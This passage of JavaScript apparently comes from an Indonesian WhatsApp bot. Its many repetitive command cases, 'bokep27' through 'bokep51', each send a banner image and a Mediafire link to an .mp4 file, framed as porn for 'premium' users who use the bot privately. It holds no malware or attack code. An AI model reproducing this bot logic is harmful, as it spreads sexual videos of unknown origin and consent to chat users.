		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/yv14rur1pzkr8b0/1_4976833430579839265.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep27':
				 if (isGroup) return reply('𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 ??𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼')
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/68zfiyemxtru1bs/1_4904503780428480986.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep28':
				 if (isGroup) return reply('𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼')
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/7dnbhv3ciba8hhq/1_4904503780428480985.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep29':	
			 if (isGroup) return reply('𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼')
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/j9fs5zmlx3dh8mr/1_4904503780428480984.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep30':
				 if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/p92nobw93fecsw1/received_1003270563800215.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep31':	
			  if (isGroup) return reply('𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿!')
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/qpsw216x7eg6hju/received_876459109648973.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep32':	
			  if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/bi7vvyuutmwyva4/received_561878425067374.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep33':	
			  if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/xovkeeb1bzb2p6q/received_604288827411481.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep34':
			  if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/fqbo50dagpx4a3c/received_583141349398702.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep35':
				  if (isGroup) return reply('𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿!')
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/z9cdyckbtsw0bik/received_605185650481223.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep36':	
			  if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/z943hvp2utw26w8/received_403005374674502.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep37':
				  if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/spnjhu5o0hs7q5p/received_1484486988600024.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep38':	
			  if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/25q6chd1j1f4ykl/received_4418039004978580.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep39':
				  if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/ta2svq1u27pdj2v/received_632639654567218.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep40':
				  if (isGroup) return reply('𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿!')
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/jkyrnt34eb4a7xj/received_253314510046052.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep41':	
			  if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/twu834cnvuqc1rw/received_1432512500467806.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep42':	
			   if (isGroup) return reply('𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿!')
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/6gctjkwlj7mukjb/received_351197870087553.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep43':
				   if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/jpqj8ri4z871t50/received_4393779417324000.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep44':	
			   if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/bbycc5vwuxvgd47/received_571836733939095.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep45':	
			   if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/g1nl5a0smd2oi33/received_240063647954902.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep46':
				   if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/q0qwxuinrryjd80/received_299673458179634.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep47':
				   if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊?? 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/0pbbul0x907ik78/received_564651334587420.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep48':
				   if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/m6y7mj4l59oq5ju/received_1136049133591127.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep49':
				   if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/tqjecvlp5jdomhg/received_458258245425414.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep50':	
			   if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/th8cchtyp5y1l0j/received_3029759737301851.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep51':
				   if (isGroup) return reply(`𝙈𝙊𝙃𝙊𝙉 𝙈𝘼𝘼𝙁 𝙆𝘼𝙆 ${pushname} 𝙅𝙄𝙆𝘼 𝙆𝘼𝙆𝘼𝙆 𝙎𝙀𝘿𝘼𝙉𝙂 𝙃𝙊𝙍𝙉𝙔 𝙇𝙀𝘽𝙄𝙃 𝘽𝘼𝙄𝙆 𝙂𝙐𝙉𝘼𝙆𝘼𝙉 𝘽𝙊𝙏 𝘿𝙄 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘾𝙃𝘼𝙏 𝘼𝙂𝘼𝙍 𝙔𝙂 𝙎𝙀𝘿𝘼𝙉𝙂 𝙍𝙀𝙃𝘼𝘽 𝘽𝙊𝙆𝙀𝙋 𝙏𝙄𝘿𝘼𝙆 𝙏𝙀𝙍𝙂𝙊𝘿𝘼!`)
   
		qute = fs.readFileSync('media/image/banner.jpg') 
		wann.sendMessage(from, qute, image, { quoted: fniv, caption: '*HAI USER PREMIUM SANGE YA? *\nLink Download \n\nhttps://www.mediafire.com/file/5studipf789ut1i/received_162667669380689.mp4/file' })				   
		 break
  //=========================================================
  case 'bokep52':
